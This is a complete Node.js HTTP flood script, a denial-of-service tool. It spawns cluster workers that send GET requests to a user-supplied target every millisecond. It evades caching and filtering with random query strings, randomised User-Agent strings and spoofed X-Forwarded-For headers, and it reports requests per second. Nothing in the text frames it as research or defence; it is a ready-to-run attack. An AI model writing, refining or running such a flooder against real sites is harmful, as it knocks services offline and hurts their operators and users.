const http = require('http');
const https = require('https');
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const os = require('os');

// ========== CONFIG ==========
let TARGET = process.argv[2];
let DURATION = parseInt(process.argv[3]) || 60;
let THREADS = parseInt(process.argv[4]) || os.cpus().length * 2;
let PROXY_FILE = process.argv[5] || null;

let proxies = [];
let requestCount = 0;
let isRunning = true;
// ============================

function loadProxies(file) {
    if (!file || !fs.existsSync(file)) return [];
    let data = fs.readFileSync(file, 'utf8');
    return data.split('\n').filter(l => l.trim()).map(l => {
        let [ip, port] = l.split(':');
        return { ip, port: parseInt(port) };
    });
}

function sendRequest(proxy) {
    if (!isRunning) return;
    const parsedUrl = url.parse(TARGET);
    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
        path: parsedUrl.path + '?' + Math.random(),
        method: 'GET',
        headers: {
            'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ${Math.random()}`,
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'X-Forwarded-For': proxy ? proxy.ip : '127.0.0.1'
        },
        agent: false
    };

    const lib = parsedUrl.protocol === 'https:' ? https : http;
    const req = lib.request(options, (res) => {
        requestCount++;
        res.resume();
    });
    req.on('error', () => {});
    req.end();
}

function attackLoop() {
    const useProxies = proxies.length > 0;
    setInterval(() => {
        for (let i = 0; i < THREADS * 2; i++) {
            let proxy = useProxies ? proxies[Math.floor(Math.random() * proxies.length)] : null;
            sendRequest(proxy);
        }
    }, 1);
}

function statsLoop() {
    setInterval(() => {
        console.log(`[+] RPS: ${requestCount} | Target: ${TARGET}`);
        requestCount = 0;
    }, 1000);
}

function timeoutLoop() {
    setTimeout(() => {
        isRunning = false;
        console.log('[!] Attack finished');
        process.exit(0);
    }, DURATION * 1000);
}

if (cluster.isMaster) {
    console.log(`[*] Target: ${TARGET}`);
    console.log(`[*] Duration: ${DURATION}s`);
    console.log(`[*] Threads: ${THREADS}`);
    console.log(`[*] Proxies: ${PROXY_FILE ? 'loaded' : 'none'}`);
    
    proxies = loadProxies(PROXY_FILE);
    console.log(`[*] Proxies count: ${proxies.length}`);
    
    for (let i = 0; i < THREADS; i++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, DURATION * 1000);
} else {
    attackLoop();
    statsLoop();
    timeoutLoop();
}